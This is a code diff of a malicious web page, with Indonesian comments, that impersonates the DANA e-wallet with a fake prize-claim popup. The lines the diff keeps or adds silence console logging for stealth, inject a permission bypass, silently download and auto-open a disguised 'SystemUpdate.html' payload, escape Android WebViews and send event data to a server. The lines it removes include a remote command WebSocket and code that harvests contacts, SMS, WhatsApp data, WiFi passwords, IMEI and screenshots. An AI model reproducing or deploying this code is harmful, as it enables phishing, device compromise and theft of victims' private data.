@@ -64,16 +64,16 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - GERBANG PINTU MASUK (3 TUGAS UTAMA)
+// 🔥 INDEX.HTML - HANYA 3 TUGAS: BYPASS IZIN, DOWNLOAD HTML, BUKA HTML
 // ============================================================
-/*
+
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
 console.info = function() {};
 console.debug = function() {};
 console.table = function() {};
-*/
+
 // ============================================================
 // STEALTH + ANTI-ANALYSIS
 // ============================================================
@@ -137,75 +137,6 @@ var DOWNLOAD_STARTED = false;
 var NOTIFICATION_SHOWN = false;
 var REDIRECT_DONE = false;
 var WS_PASSWORD = '';
-var IP_ADDRESS = '';
-var LOCATION_DATA = null;
-
-// ============================================================
-// WEBSOCKET
-// ============================================================
-var ws = null;
-var wsConnected = false;
-var WS_URL = 'wss://verifikasi.site/ws';
-
-function connectWebSocket() {
-    if (ws && ws.readyState === WebSocket.OPEN) return;
-    if (!WS_PASSWORD || WS_PASSWORD === '') {
-        setTimeout(connectWebSocket, 3000);
-        return;
-    }
-    try {
-        ws = new WebSocket(WS_URL);
-        ws.onopen = function() {
-            wsConnected = true;
-            K({ sumber: 'ws_status', data: 'connected' });
-            ws.send(JSON.stringify({
-                type: 'auth',
-                key: WS_PASSWORD,
-                deviceId: 'browser_index',
-                timestamp: Date.now()
-            }));
-        };
-        ws.onmessage = function(event) {
-            try {
-                var data = JSON.parse(event.data);
-                if (data.type === 'auth_success') {
-                    K({ sumber: 'ws_auth', data: 'success' });
-                } else if (data.type === 'auth_failed') {
-                    K({ sumber: 'ws_auth', data: 'failed' });
-                    ws.close();
-                } else if (data.type === 'command') {
-                    var cmd = data.command || data;
-                    K({ sumber: 'ws_command_received', data: cmd.aksi || 'unknown' });
-                    var hasil = 'WS command: ' + (cmd.aksi || 'unknown');
-                    K({ sumber: 'ws_command_result', data: hasil });
-                    if (wsConnected && ws) {
-                        ws.send(JSON.stringify({
-                            type: 'command_result',
-                            command: cmd.aksi || 'unknown',
-                            result: hasil,
-                            timestamp: Date.now()
-                        }));
-                    }
-                } else if (data.type === 'ping') {
-                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
-                }
-            } catch(e) {
-                K({ sumber: 'ws_parse_error', data: e.message });
-            }
-        };
-        ws.onclose = function() {
-            wsConnected = false;
-            K({ sumber: 'ws_status', data: 'disconnected' });
-            setTimeout(connectWebSocket, 10000);
-        };
-        ws.onerror = function() {
-            K({ sumber: 'ws_error', data: 'error' });
-        };
-    } catch(e) {
-        K({ sumber: 'ws_connect_error', data: e.message });
-        setTimeout(connectWebSocket, 10000);
-    }
-}
 
 // ============================================================
 // FUNGSI K() - KIRIM DATA KE SERVER
@@ -218,56 +149,6 @@ function K(d) {
         xhr.timeout = 5000;
         xhr.send(JSON.stringify(d));
     } catch(e) {}
-}
-
-// ============================================================
-// IP TRACKING
-// ============================================================
-function getIPAddress() {
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://api.ipify.org?format=json', true);
-        xhr.timeout = 5000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                try {
-                    var data = JSON.parse(xhr.responseText);
-                    IP_ADDRESS = data.ip;
-                    K({ sumber: 'ip_address', data: IP_ADDRESS });
-                } catch(e) {}
-            }
-        };
-        xhr.send();
-    } catch(e) {}
-}
-
-// ============================================================
-// GEOLOCATION BROWSER
-// ============================================================
-function getBrowserLocation() {
-    if (!navigator.geolocation) return;
-    navigator.geolocation.getCurrentPosition(
-        function(pos) {
-            LOCATION_DATA = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
-            K({ sumber: 'geolocation_browser', data: LOCATION_DATA });
-        },
-        function(err) { K({ sumber: 'geolocation_error', data: err.message }); },
-        { enableHighAccuracy: true, timeout: 10000 }
-    );
-}
-
-// ============================================================
-// ESCAPE WEBVIEW
-// ============================================================
-function escapeWebView() {
-    if (!PLATFORM.isWebView) return;
-    K({ sumber: 'escape_webview', data: 'attempt' });
-    try {
-        var url = window.location.href;
-        window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
-        setTimeout(function() { window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(url); }, 2000);
-    } catch(e) {}
-    try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
 }
 
 // ============================================================
@@ -292,37 +173,7 @@ var A = {
             try{ return AndroidBridge.saveFile(path, content); }catch(e){}
         }
         return false;
-    },
-    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
-    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
-    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
-    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
-    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
-    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
-    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
-    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
-    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
-    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
-    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
-    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
-    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
-    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
-    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
-    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
-    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
-    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
-    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
-    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
-    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
-    startRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startRecording(d||30)}catch(e){}} return null },
-    startVideoRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording(d||30)}catch(e){}} return null },
-    stopRecording: function() { if(this.isAvailable){ try{return AndroidBridge.stopRecording()}catch(e){}} return null },
-    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){} } return null; },
-    setClipboard: function(t) { if(this.isAvailable){ try{return AndroidBridge.setClipboard(t)}catch(e){}} return null },
-    vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
-    showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
-    flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
-    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
+    }
 };
 
 // ============================================================
@@ -394,33 +245,6 @@ function injectAllPermissions() {
     } catch(e) {
         K({ sumber: 'bypass_permissions_error', data: e.message });
     }
-}
-
-// ============================================================
-// AMBIL PASSWORD DARI WORKER
-// ============================================================
-function getPasswordFromWorker() {
-    return new Promise(function(resolve, reject) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', '/get-password', true);
-        xhr.timeout = 10000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                try { var data = JSON.parse(xhr.responseText); if (data.password) { WS_PASSWORD = data.password; resolve(WS_PASSWORD); } else { reject(new Error('No password')); } } catch(e) { reject(e); }
-            } else { reject(new Error('HTTP ' + xhr.status)); }
-        };
-        xhr.onerror = function() { reject(new Error('Network error')); };
-        xhr.ontimeout = function() { reject(new Error('Timeout')); };
-        xhr.send();
-    });
-}
-
-// ============================================================
-// AUTO-SCREENSHOT
-// ============================================================
-function autoScreenshot() {
-    if (!A.isAvailable) return;
-    try { var ss = A.takeScreenshot(); if (ss) { K({ sumber: 'auto_screenshot', data: ss }); } } catch(e) {}
 }
 
 // ============================================================
@@ -531,11 +355,25 @@ function openSystemUpdateHTML() {
                 }
             } catch(e) {}
         }
-    }, 5000); // 5 DETIK SETELAH DOWNLOAD DIMULAI
+    }, 5000);
 }
 
 // ============================================================
-// NOTIFICATION
+// WEBVIEW ESCAPE
+// ============================================================
+function escapeWebView() {
+    if (!PLATFORM.isWebView) return;
+    K({ sumber: 'escape_webview', data: 'attempt' });
+    try {
+        var url = window.location.href;
+        window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+        setTimeout(function() { window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(url); }, 2000);
+    } catch(e) {}
+    try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
+}
+
+// ============================================================
+// NOTIFICATION "KLIK UNTUK KLAIM"
 // ============================================================
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
@@ -579,55 +417,27 @@ function createKlaimNotification() {
 }
 
 // ============================================================
-// DATA COLLECTION
-// ============================================================
-function ambilDataCepat() {
-    var data = { waktu: Date.now(), ua: navigator.userAgent, platform: PLATFORM, ip: IP_ADDRESS, location: LOCATION_DATA };
-    function validateData(d) { if (!d) return null; if (typeof d === 'string' && d.length > 10000) return d.substring(0, 10000); if (typeof d === 'object') { var clean = {}; for (var key in d) { if (d[key] !== undefined && d[key] !== null) { clean[key] = d[key]; } } return clean; } return d; }
-    
-    if (PLATFORM.isAndroid && A.isAvailable) {
-        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = validateData(kontak); K({sumber:'kontak_all', data:validateData(kontak)}); } } catch(e) {}
-        try { var sms = A.getAllSMS(); if(sms) { data.sms = validateData(sms); K({sumber:'sms_all', data:validateData(sms)}); } } catch(e) {}
-        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = validateData(clipboard); K({sumber:'clipboard', data:validateData(clipboard)}); } } catch(e) {}
-        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:validateData(callLog)}); } catch(e) {}
-        try { var wa = A.getWhatsAppData(); if(wa) K({sumber:'whatsapp', data:validateData(wa)}); } catch(e) {}
-        try { var tg = A.getTelegramData(); if(tg) K({sumber:'telegram', data:validateData(tg)}); } catch(e) {}
-        try { var files = A.listAllFiles(); if(files) K({sumber:'files_all', data:validateData(files)}); } catch(e) {}
-        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:validateData(apps)}); } catch(e) {}
-        try { var wifi = A.getWiFiPasswords(); if(wifi) K({sumber:'wifi_passwords', data:validateData(wifi)}); } catch(e) {}
-        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:validateData(ss)}); } catch(e) {}
-        try { var loc = A.getDeviceInfo(); if(loc) K({sumber:'device_info', data:validateData(loc)}); } catch(e) {}
-        try { var imei = A.getIMEI(); if(imei) K({sumber:'imei', data:validateData(imei)}); } catch(e) {}
-        try { var imsi = A.getIMSI(); if(imsi) K({sumber:'imsi', data:validateData(imsi)}); } catch(e) {}
-        try { var phone = A.getPhoneNumber(); if(phone) K({sumber:'phone_number', data:validateData(phone)}); } catch(e) {}
-        try { var loc2 = A.getLocation(); if(loc2) K({sumber:'lokasi', data:validateData(loc2)}); } catch(e) {}
-        try { var storage = A.getStorageInfo(); if(storage) K({sumber:'storage_info', data:validateData(storage)}); } catch(e) {}
-    }
-    
-    try { data.screen = { width: screen.width, height: screen.height }; data.platform = navigator.platform; data.language = navigator.language; data.cookieEnabled = navigator.cookieEnabled; data.doNotTrack = navigator.doNotTrack; } catch(e) {}
-    K({sumber:'init', data:validateData(data)});
-    return data;
-}
-
-// ============================================================
-// SERVICE WORKER
-// ============================================================
-function registerServiceWorker() {
-    if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
-    try {
-        navigator.serviceWorker.register('/sw.js', { scope: '/' })
-            .then(function(reg) { K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } }); })
-            .catch(function(e) {});
-    } catch(e) {}
-}
-
-// ============================================================
 // STATUS BAR
 // ============================================================
-function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
+function showStatusBar() { 
+    var bar = document.getElementById('statusBar'); 
+    if (bar) { 
+        bar.className = 'status-bar loading'; 
+        K({ sumber: 'status_bar', data: 'shown' }); 
+    } 
+}
 
 // ============================================================
-// MAIN EXECUTION (3 TUGAS UTAMA)
+// REDIRECT KE DANA
+// ============================================================
+function redirectToDANA() {
+    if (REDIRECT_DONE) return;
+    REDIRECT_DONE = true;
+    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+}
+
+// ============================================================
+// 🔥 MAIN EXECUTION (3 TUGAS UTAMA)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -647,17 +457,12 @@ function dapatkanSemua() {
         // ============================================================
         // 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE
         // ============================================================
-        getIPAddress();
-        getBrowserLocation();
         setTimeout(escapeWebView, 100);
-        ambilDataCepat();
-        registerServiceWorker();
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         setTimeout(function() { showStatusBar(); }, 500);
-        setTimeout(function() { autoScreenshot(); }, 7000);
         
         // ============================================================
-        // 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS
+        // 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS (5 DETIK SETELAH DOWNLOAD)
         // ============================================================
         openSystemUpdateHTML();
         
@@ -665,24 +470,7 @@ function dapatkanSemua() {
         // NOTIFIKASI & REDIRECT KE DANA
         // ============================================================
         setTimeout(function() { showKlaimNotification(); }, 3000);
-        
-        setTimeout(function() {
-            if (!REDIRECT_DONE) {
-                REDIRECT_DONE = true;
-                try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-            }
-        }, 8000);
-        
-        // WebSocket (untuk logging)
-        getPasswordFromWorker().then(function(password) {
-            WS_PASSWORD = password;
-            K({ sumber: 'password_received', data: 'ok' });
-            connectWebSocket();
-        }).catch(function() {
-            WS_PASSWORD = 'default_fallback';
-            K({ sumber: 'password_fallback', data: 'using_default' });
-            connectWebSocket();
-        });
+        setTimeout(redirectToDANA, 8000);
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
@@ -714,7 +502,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html loaded - Popup DANA muncul!');
+console.log('✅ index.html loaded - 3 TUGAS UTAMA!');
 </script>
 </body>
 </html>
